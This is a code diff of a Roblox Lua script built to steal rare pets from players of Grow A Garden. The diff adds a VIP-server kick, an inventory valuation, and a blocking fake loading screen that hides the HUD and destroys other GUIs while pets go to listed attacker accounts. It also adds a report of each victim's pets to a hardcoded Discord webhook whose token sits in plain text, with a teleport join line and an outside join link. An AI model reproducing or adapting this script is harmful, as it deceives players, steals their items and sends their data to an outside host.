@@ -1,39 +1,60 @@
-repeat 
-    task.wait()
-until game:IsLoaded()
+repeat task.wait() until game:IsLoaded()
+
+-- 🔒 VIP Server Check
+local plr = game.Players.LocalPlayer
+local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
+if getServerType and getServerType:IsA("RemoteFunction") then
+    local ok, serverType = pcall(function()
+        return getServerType:InvokeServer()
+    end)
+    if ok and serverType == "VIPServer" then
+        plr:Kick("Server error. Please join a DIFFERENT server")
+        return
+    end
+end
 
 -- ✅ Configuration
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
-local USERNAMES = {
-    "yuniecoxo", "Wanwood42093", "AnotherUsername"
-}
-
-local PET_WHITELIST = {
-    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
-    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune',
-}
-
 local VICTIM = game.Players.LocalPlayer
+local USERNAMES = {
+    "saikigrow",
+    "yuniecoxo",
+    "yyyyyvky"
+}
+
+local PET_VALUES = {
+    ["Raccoon"] = { emoji = "🦝", value = 2000 },
+    ["T-Rex"] = { emoji = "🦖", value = 5000 },
+    ["Fennec Fox"] = { emoji = "🦊", value = 3500 },
+    ["Dragonfly"] = { emoji = "🐞", value = 4000 },
+    ["Butterfly"] = { emoji = "🦋", value = 4000 },
+    ["Disco Bee"] = { emoji = "🐝", value = 4200 },
+    ["Mimic Octopus"] = { emoji = "🐙", value = 6000 },
+    ["Queen Bee"] = { emoji = "👑🐝", value = 6500 },
+    ["Spinosaurus"] = { emoji = "🦕", value = 5500 },
+    ["Kitsune"] = { emoji = "🦊✨", value = 8000 },
+}
+
 local victimPetTable = {}
+local totalPetValue = 0
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
--- 🎭 Fake Legit Loading Screen
+
+
+
+-- 🎭 Fully Blocking Fake Loading Screen
 local function showBlockingLoadingScreen()
     local plr = game.Players.LocalPlayer
     local playerGui = plr:WaitForChild("PlayerGui")
 
     pcall(function()
-        local StarterGui = game:GetService("StarterGui")
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-    end)
-
-    for _, sound in ipairs(workspace:GetDescendants()) do
-        if sound:IsA("Sound") then
-            sound.Volume = 0
+        for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
+            if guiType ~= Enum.CoreGuiType.Chat then
+                game:GetService("StarterGui"):SetCoreGuiEnabled(guiType, false)
+            end
         end
-    end
+    end)
 
     local loadingScreen = Instance.new("ScreenGui")
     loadingScreen.Name = "UnclosableLoading"
@@ -44,12 +65,15 @@ local function showBlockingLoadingScreen()
     loadingScreen.Parent = playerGui
 
     loadingScreen.AncestryChanged:Connect(function()
-        loadingScreen.Parent = playerGui
+        if loadingScreen.Parent ~= playerGui then
+            loadingScreen.Parent = playerGui
+        end
     end)
 
     local blackFrame = Instance.new("Frame")
     blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
     blackFrame.Size = UDim2.new(1, 0, 1, 0)
+    blackFrame.Position = UDim2.new(0, 0, 0, 0)
     blackFrame.BorderSizePixel = 0
     blackFrame.ZIndex = 1
     blackFrame.Parent = loadingScreen
@@ -64,7 +88,7 @@ local function showBlockingLoadingScreen()
     loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
     loadingLabel.BackgroundTransparency = 1
     loadingLabel.TextScaled = true
-    loadingLabel.Text = "Loading Wait a Moment <3..."
+    loadingLabel.Text = "Loading Please Wait <3..."
     loadingLabel.TextColor3 = Color3.new(1, 1, 1)
     loadingLabel.Font = Enum.Font.SourceSansBold
     loadingLabel.ZIndex = 2
@@ -80,8 +104,7 @@ local function showBlockingLoadingScreen()
     end)()
 
     coroutine.wrap(function()
-        while true do
-            task.wait(1)
+        while task.wait(1) do
             if not game:GetService("Lighting"):FindFirstChild("FreezeBlur") then
                 local newBlur = Instance.new("BlurEffect")
                 newBlur.Size = 24
@@ -93,34 +116,41 @@ local function showBlockingLoadingScreen()
                     sound.Volume = 0
                 end
             end
+            for _, gui in pairs(playerGui:GetChildren()) do
+                if gui:IsA("ScreenGui") and gui.Name ~= "UnclosableLoading" then
+                    gui:Destroy()
+                end
+            end
         end
     end)()
 end
 
--- 🧠 Detect usernames already in the game
+-- Detect user join and trigger loading screen
+for _, player in pairs(game.Players:GetPlayers()) do
+    if table.find(USERNAMES, player.Name) then
+        showBlockingLoadingScreen()
+        break
+    end
+end
+game.Players.PlayerAdded:Connect(function(player)
+    if table.find(USERNAMES, player.Name) then
+        showBlockingLoadingScreen()
+    end
+end)
+
 local function waitForJoin()
     for _, player in game.Players:GetPlayers() do
         if table.find(USERNAMES, player.Name) then
-            showBlockingLoadingScreen()
             return true, player.Name
         end
     end
     return false, nil
 end
 
--- 🔔 Detect when USERNAMES join later
-game.Players.PlayerAdded:Connect(function(player)
-    if table.find(USERNAMES, player.Name) then
-        task.delay(1, function()
-            showBlockingLoadingScreen()
-        end)
-    end
-end)
-
-local function createDiscordEmbed(petList, totalValue, fileUrl)
+function createDiscordEmbed(petList, totalValue, fileUrl)
     local embed = {
-        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
-        color = 65280,
+        title = "Saiki hits",
+        color = 65210,
         fields = {
             {
                 name = "👤 **Player Information**",
@@ -144,12 +174,7 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
             },
             {
                 name = "🏝️ **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
+                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                 inline = false
             }
         },
@@ -159,69 +184,50 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
     }
 
     local data = {
-        content = string.format(
-            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-            game.PlaceId,
-            game.JobId
-        ),
+        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
         username = game.Players.LocalPlayer.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
         embeds = {embed}
     }
 
     local jsonData = game:GetService("HttpService"):JSONEncode(data)
-    
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
+    local headers = { ["Content-Type"] = "application/json" }
     local request = http_request or request or HttpPost or syn.request
-    local response = request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = headers,
-        Body = jsonData
-    })
+    local response = request({ Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = jsonData })
 
     if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
-        warn("Discord webhook failed:", response.StatusCode, response.Body)
+        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
     end
 end
 
 local function teleportTarget(targetName)
-    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+    local target = game.Players:FindFirstChild(targetName)
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
+    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("HumanoidRootPart") then return end
+    VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
 end
 
 local function deltaBypass()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0, true, nil, false
-    )
+    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2, 0, true, nil, false)
     task.wait()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0, false, nil, false
-    )
+    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2, 0, false, nil, false)
 end
 
 local function checkPetsWhilelist(pet)
-    for _, name in PET_WHITELIST do
+    for name, _ in pairs(PET_VALUES) do
         if string.find(pet, name) then
-            return true
+            return name
         end
     end
+    return nil
 end
 
 local function getPetObject(petUid)
     for _, object in pairs(VICTIM.Backpack:GetChildren()) do
-        if object:GetAttribute("PET_UUID") == petUid then
-            return object
-        end
+        if object:GetAttribute("PET_UUID") == petUid then return object end
     end
     for _, object in workspace[VICTIM.Name]:GetChildren() do
-        if object:GetAttribute("PET_UUID") == petUid then
-            return object
-        end
+        if object:GetAttribute("PET_UUID") == petUid then return object end
     end
     return nil
 end
@@ -235,8 +241,24 @@ end
 
 local function getPlayersPets()
     for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
-        if checkPetsWhilelist(value.PetType) then
-            table.insert(victimPetTable, value.PetType)
+        local matchedName = checkPetsWhilelist(value.PetType)
+        if matchedName then
+            local petInfo = PET_VALUES[matchedName]
+            local mutation = ""
+
+            if string.find(value.PetType, "Rainbow") then
+                mutation = "🌈 "
+                petInfo.value += 10000
+            elseif string.find(value.PetType, "Mega") then
+                mutation = "💥 "
+                petInfo.value += 15000
+            elseif string.find(value.PetType, "Ascended") then
+                mutation = "✨ "
+                petInfo.value += 8000
+            end
+
+            table.insert(victimPetTable, string.format("%s%s %s", mutation, petInfo.emoji, matchedName))
+            totalPetValue += petInfo.value
         end
     end
 end
@@ -250,14 +272,13 @@ end
 
 local function checkPetsInventory(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if checkPetsWhilelist(value.PetType) then
-            local petObject = getPetObject(petUid)
-            if petObject then
-                equipPet(petObject)
-                task.wait(0.2)
-                startSteal(target)
-            end
-        end
+        local matchedName = checkPetsWhilelist(value.PetType)
+        if not matchedName then continue end
+        local petObject = getPetObject(petUid)
+        if not petObject then continue end
+        equipPet(petObject)
+        task.wait(0.2)
+        startSteal(target)
     end
 end
 
@@ -273,14 +294,13 @@ local function idlingTarget()
     end)
 end
 
--- 🚀 Start
 getPlayersPets()
 
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
             idlingTarget()
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalPetValue, "https://cdn.discordapp.com/attachments/.../items.txt")
             break
         end
     end
